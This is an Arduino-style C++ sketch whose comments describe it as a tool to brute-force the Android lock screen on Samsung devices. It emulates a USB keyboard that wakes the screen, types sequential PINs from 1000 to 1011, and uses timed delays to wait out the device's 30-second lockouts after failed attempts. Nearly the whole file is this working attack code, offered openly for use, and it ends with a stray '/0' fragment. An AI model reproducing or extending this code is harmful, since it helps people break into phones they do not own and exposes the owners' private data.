// Initializing the project, 
//This project is designed to brute the android login screen.
#include <HIDKeyboard.h>

//included the HIDKeyboard Lib

HIDKeyboard keyboard; // Initialize HIDKeyboard object.

void setup() {
  keyboard.begin(); // Start communication with the target machine.
  delay(2000);
}

void loop() {

// login on the device starts from here, it varries from device to device, this code was designed in a way to work on samsung devices.
// this project is scripted on how the way the device acts while conecting to a real keyboard device.
// in this case it used two enter taps to start the screen and then go to the main password input screen 
//(sometimes some devices take enter with space key to start the device), depending upon the device change the "keyboard.pressSpecialKey(key_value)".

  keyboard.pressSpecialKey(ENTER);  //turns on the screen
  keyboard.releaseKey();
  delay(200);                       //waits for 200 ms
  keyboard.pressSpecialKey(ENTER);  // sends the enter key again to go to the password input screen
  keyboard.releaseKey();
  delay(1000);
  keyboard.println("1000");         // sends the key to the device.
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);  // clicks enter to check the password.
  keyboard.releaseKey();
  
  delay(1000);
  keyboard.println("1001");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(1000);
  keyboard.println("1002");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(1000);
  keyboard.println("1003");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(1000);
  keyboard.println("1004");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(31000);                     //after 5 unsuccessful attempts it gives a timeout for 30 sec
  keyboard.pressSpecialKey(ENTER);  // again turning on the screen
  keyboard.releaseKey();
  delay(200);
  keyboard.pressSpecialKey(ENTER);   
  keyboard.releaseKey();
  delay(200);
  keyboard.println("1005");         //putting the key to the device.
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(1000);
  keyboard.println("1006");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(1000);
  keyboard.println("1007");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(1000);
  keyboard.println("1008");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(1000);
  keyboard.println("1009");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(31000); //after 10 unsucessful attempts the android device gives a 30 sec timeout for every unsucessful attempt. //so from here every entry should have a 30 sec delay on the begining.
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  delay(200);
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  delay(200);
  keyboard.println("1010");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  delay(31000);
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  delay(200);
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  delay(200);
  keyboard.println("1011");
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  
  while(1);
}
/0
